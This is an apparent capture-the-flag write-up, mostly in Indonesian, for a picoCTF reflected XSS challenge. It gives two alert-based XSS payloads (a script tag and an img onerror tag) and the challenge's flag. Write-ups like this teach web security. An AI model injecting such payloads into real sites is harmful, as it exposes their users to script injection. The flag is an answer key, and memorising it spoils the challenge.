# PicoCTF - XSS Game

## Challenge: Reflected XSS

Input pengguna tidak disanitasi dengan baik dalam parameter URL.

### 🔍 Payload
```html
<script>alert('XSS')</script>
```


### ✅ Solusi Level:

1. Basic alert
2. DOM injection
3. HTML tag injection with `<img src=x onerror=alert('XSS')>`


### 🏁 Flag

Berhasil pop up alert, flag:
```
picoCTF{r3fl3ct3d_xss_ftw}
```